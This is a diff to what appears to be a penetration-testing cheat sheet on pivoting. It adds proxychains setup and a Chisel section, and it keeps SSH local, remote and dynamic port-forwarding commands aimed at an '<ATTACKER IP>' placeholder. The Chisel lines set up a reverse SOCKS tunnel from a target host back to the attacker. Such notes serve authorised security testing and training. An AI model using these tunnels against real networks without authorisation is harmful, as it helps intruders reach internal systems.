@@ -36,12 +36,21 @@ ssh -N user@<ATTACKER IP> -p 22 -L 0.0.0.0:4444:127.0.0.1:4444
 ssh -N -R <BIND_ADRESS>:<PORT>:127.0.0.1:<TARGET PORT> <USERNAME>@<ATTACKER IP>
 ```
 
-### Dynamic port forwarding
+### Proxychains
+- Prepend ```proxychains``` command before every command to send through the proxychain.
+- Change proxychains config to the correct port and protocol! ```vim /etc/proxychains.conf```
+- Example: ```socks4		127.0.0.1 9000```
+
+#### SSH
 ```
 sudo ssh -N -D 127.0.0.1:9000 <username>@<IP>
-vim  /etc/proxychains.conf
-socks4		127.0.0.1 9000 #Change this value
-#prepend proxychains command before every command to send through the proxychain.
+```
+
+#### Chisel
+- https://github.com/jpillora/chisel
+```
+/opt/chisel/chisel server -p 443 --socks5 --reverse
+shellcmd ./chisel.exe client <ATTACKER IP>:443 R:socks
 ```
 
 #### Port forwarding plink.exe
